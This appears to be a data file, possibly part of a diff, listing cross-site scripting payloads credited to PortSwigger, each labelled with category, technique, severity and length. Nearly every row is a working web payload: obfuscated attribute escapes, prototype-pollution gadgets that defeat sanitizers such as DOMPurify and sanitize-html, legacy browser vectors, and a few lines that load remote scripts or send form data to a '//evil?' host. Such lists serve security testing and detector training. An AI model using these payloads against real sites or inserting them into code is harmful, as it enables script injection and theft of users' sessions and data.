+';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,125,portswigger
+';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,123,portswigger
+';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,123,portswigger
+';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,122,portswigger
+';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,125,portswigger
+';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,125,portswigger
+';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,129,portswigger
+<script>Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';</script>,dom_sink,event_handler,high,75,portswigger
+<script>Object.prototype.preventDefault='x';Object.prototype.handleObj='x';Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');</script>,script_injection,obfuscation,high,214,portswigger
+"<script>Object.prototype.div=['1','<img src onerror=alert(1)>','1']</script><script>$('<div x=""x""></div>')</script>",script_injection,event_handler,high,115,portswigger
+"<script>Object.prototype.url = ['data:,alert(1)//'];Object.prototype.dataType = 'script';</script><script>$.get('https://google.com/');$.post('https://google.com/');</script>",script_injection,obfuscation,high,174,portswigger
+"<script>Object.prototype.src = ['data:,alert(1)//']</script><script>$.getScript('https://google.com/')</script>",script_injection,obfuscation,high,111,portswigger
+"<script>Object.prototype.url = 'data:,alert(1)//'</script><script>$.getScript('https://google.com/')</script>",script_injection,obfuscation,high,109,portswigger
+"<script>Object.prototype.srcdoc=['<script>alert(1)<\/script>']</script><div class=""g-recaptcha"" data-sitekey=""your-site-key""/>",script_injection,script_tag,high,126,portswigger
+<script>Object.prototype.hif = ['javascript:alert(document.domain)'];</script>,script_injection,script_tag,high,78,portswigger
+<script>Object.prototype.attrs = {src:1};Object.prototype.src='https://portswigger-labs.net/xss/xss.js'</script>,script_injection,obfuscation,high,112,portswigger
+<script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>,script_injection,obfuscation,high,106,portswigger
+<script>Object.prototype.sourceURL = '\u2028\u2029alert(1)'</script><script>_.template('test')</script>,script_injection,encoding,high,103,portswigger
+<script>Object.prototype['*'] = ['onload']</script><script>document.write(sanitizeHtml('<iframe onload=alert(1)>'))</script>,dom_sink,event_handler,high,124,portswigger
+"<script>Object.prototype.whiteList = {img: ['onerror', 'src']}</script><script>document.write(filterXSS('<img src onerror=alert(1)>'))</script>",dom_sink,event_handler,high,143,portswigger
+"<script>Object.prototype.ALLOWED_ATTR = ['onerror', 'src']</script><script>document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))</script>",dom_sink,event_handler,high,148,portswigger
+<script>Object.prototype.documentMode = 9</script>,script_injection,script_tag,high,50,portswigger
+<script>const html = '<img src onerror=alert(1)>';const sanitizer = new goog.html.sanitizer.HtmlSanitizer();const sanitized = sanitizer.sanitize(html);const node = goog.dom.safeHtmlToNode(sanitized);document.body.append(node);</script>,script_injection,event_handler,high,235,portswigger
+"<script>Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';</script>",script_injection,obfuscation,high,73,portswigger
+"<script>Object.prototype.tagName = 'img'Object.prototype.src = ['x:x']Object.prototype.onerror = ['alert(1)']</script><script>(function() {var View = Mn.View.extend({template: '#template-layout'});var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});var app = new App();app.start();})();</script><div id=""template-layout"" type=""x-template/underscore"">xxx</div>",script_injection,script_tag,high,407,portswigger
+"<script>Object.prototype.src='data:,alert(1)//'</script>",script_injection,obfuscation,high,56,portswigger
+<script>Object.prototype.onload = 'alert(1)'</script>,script_injection,script_tag,high,53,portswigger
+"<script>Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']</script>",script_injection,event_handler,high,104,portswigger
+"<strong data-bind=""text:'hello'""></strong><script>Object.prototype[4]=""a':1,[alert(1)]:1,'b"";Object.prototype[5]=',';</script><script>ko.applyBindings({})</script>",script_injection,script_tag,high,163,portswigger
+"<script>Object.prototype.on = 'click';$('body').on('click', function() { alert('Injected Event'); });$('body').trigger('click');</script>",script_injection,script_tag,high,137,portswigger
+"<img src=""javascript:alert(1)"">",generic,protocol,medium,31,portswigger
+"<body background=""javascript:alert(1)"">",generic,protocol,medium,39,portswigger
+"<iframe src=""data:text/html,<img src=1 onerror=alert(document.domain)>"">",attribute,event_handler,high,72,portswigger
+"<a href=""vbscript:MsgBox+1"">XSS</a>
+<a href=""#"" onclick=""vbs:Msgbox+1"">XSS</a>
+<a href=""#"" onclick=""VBS:Msgbox+1"">XSS</a>
+<a href=""#"" onclick=""vbscript:Msgbox+1"">XSS</a>
+<a href=""#"" onclick=""VBSCRIPT:Msgbox+1"">XSS</a>
+<a href=""#"" language=vbs onclick=""vbscript:Msgbox+1"">XSS</a>",attribute,event_handler,medium,278,portswigger
+"<a href=""#"" onclick=""jscript.compact:alert(1);"">test</a>
+<a href=""#"" onclick=""JSCRIPT.COMPACT:alert(1);"">test</a>",attribute,event_handler,medium,113,portswigger
+"<a href=# language=""JScript.Encode"" onclick=""#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"">XSS</a>
+<a href=# onclick=""JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"">XSS</a>",attribute,event_handler,medium,162,portswigger
+"<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>",event_handler,event_handler,high,138,portswigger
+"<a title=""&{alert(1)}"">XSS</a>",generic,tag_injection,medium,30,portswigger
+"<link href=""xss.js"" rel=stylesheet type=""text/javascript"">",generic,tag_injection,medium,58,portswigger
+<form><button name=x formaction=x><b>stealme,generic,tag_injection,medium,44,portswigger
+"<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=""supersecret""</script>",script_injection,script_tag,high,105,portswigger
+"<div style=""-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"">
+<div style=""\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"">
+<div style=""-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"">
+<div style=""-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"">",generic,encoding,medium,309,portswigger
+"<img src=""blah"" style=""-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)"" />",generic,obfuscation,medium,610,portswigger
+"<div style=xss:expression(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio&#x5c;6e(alert(1))>",generic,encoding,medium,281,portswigger
+"<div style=xss=expression(alert(1))>
+<div style=""color&#x3dred"">test</div>",generic,encoding,medium,74,portswigger
+"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(1)"">XSS</a>",generic,protocol,medium,83,portswigger
+"<script>
+function window.onload(){
+alert(1);
+}
+</script>
+<script>
+function window::onload(){
+alert(1);
+}
+</script>
+<script>
+function window.location(){
+}
+</script>
+<body>
+<script>
+function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}
+</script>
+</body>
+<body>
+<script>
+function document.body.innerHTML(){ x = ""<img src=1 onerror=alert(1)>""; }
+</script>
+</body>",dom_sink,obfuscation,high,373,portswigger
+"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<img src=1 onerror=alert(1)>""> </BODY></HTML>",attribute,event_handler,high,215,portswigger
+"<a href=""javascript& #x6a;avascript:alert(1)"">Firefox</a>",generic,tag_injection,medium,57,portswigger
+"<a href=""javascript& colon ;alert(1)"">Firefox</a>",generic,tag_injection,medium,49,portswigger
+"<!- - ><img title=""--><iframe/onload=alert(1)>""> -->
+<!-     - ><img title=""--><iframe/onload=alert(1)>""> -->",attribute,event_handler,high,109,portswigger
+<svg><xss onload=alert(1)>,event_handler,event_handler,high,26,portswigger
+"<isindex type=image src=""//evil?",generic,obfuscation,medium,32,portswigger
+"<isindex type=submit style=width:100%;height:100%; value=XSS formaction=""//evil?",generic,obfuscation,medium,80,portswigger
+<isindex type=submit formaction=javascript:alert(1)>,generic,protocol,medium,52,portswigger
+<isindex type=submit action=javascript:alert(1)>,generic,protocol,medium,48,portswigger
+<svg><discard onbegin=alert(1)>,event_handler,event_handler,high,31,portswigger
+"<svg><use href=""//subdomain1.portswigger-labs.net/use_element/upload.php#x"" /></svg>",generic,obfuscation,medium,84,portswigger
+<img src=validimage.png onloadstart=alert(1)>,event_handler,event_handler,medium,45,portswigger
+<input type=image onloadend=alert(1) src=validimage.png>,event_handler,event_handler,medium,56,portswigger
+<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>,event_handler,event_handler,medium,55,portswigger
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>,event_handler,event_handler,medium,55,portswigger
+<marquee onstart=alert(1)>XSS</marquee>,event_handler,event_handler,medium,39,portswigger
+<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>,event_handler,event_handler,medium,90,portswigger
+<script>location.protocol='javascript'</script>,script_injection,script_tag,high,47,portswigger
+"<a href=""%0aalert(1)"" onclick=""protocol='javascript'"">test</a>",attribute,event_handler,medium,62,portswigger
+"<svg><use href=""data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x"" /></svg>",generic,protocol,medium,270,portswigger
+"<svg><use href=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" />",attribute,obfuscation,high,149,portswigger
+"<a href=""javascript://%0aalert(1)"">XSS</a>",generic,obfuscation,medium,42,portswigger
+"<base href=""javascript:/a/-alert(1)///////""><a href=../lol/safari.html>test</a>",generic,obfuscation,medium,79,portswigger
+"<object data=""javascript:alert(1)"">",generic,protocol,medium,35,portswigger
+"<embed src=""javascript:alert(1)"">",generic,protocol,medium,33,portswigger
+<object data=# codebase=javascript:alert(document.domain)//>,generic,obfuscation,medium,60,portswigger
+<embed src=# codebase=javascript:alert(document.domain)//>,generic,obfuscation,medium,58,portswigger
+"<object data=""#
+alert(1)"" codebase=javascript://>",generic,obfuscation,medium,49,portswigger
+"<object data=""#!
+alert(1)"" codebase=javascript:>",generic,protocol,medium,48,portswigger
+"<embed src=""#
+alert(1)"" codebase=javascript://>",generic,obfuscation,medium,47,portswigger
+"<embed src=""#!
+alert(1)"" codebase=javascript:>",generic,protocol,medium,46,portswigger
+"<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>",script_injection,event_handler,high,89,portswigger
+"<svg onload=""throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}"">",attribute,obfuscation,high,95,portswigger
+"<body onload=""throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}"">",attribute,obfuscation,high,97,portswigger
+"<svg><use href=""data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x""></use></svg>",generic,obfuscation,medium,257,portswigger
+"<svg><animate xlink:href=""#x"" attributeName=""href"" values=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" /><use id=x />",attribute,obfuscation,high,204,portswigger
+<x onbeforescriptexecute=alert(1)><script>1</script>,script_injection,event_handler,high,52,portswigger
+<x onafterscriptexecute=alert(1)><script>1</script>,script_injection,event_handler,high,51,portswigger
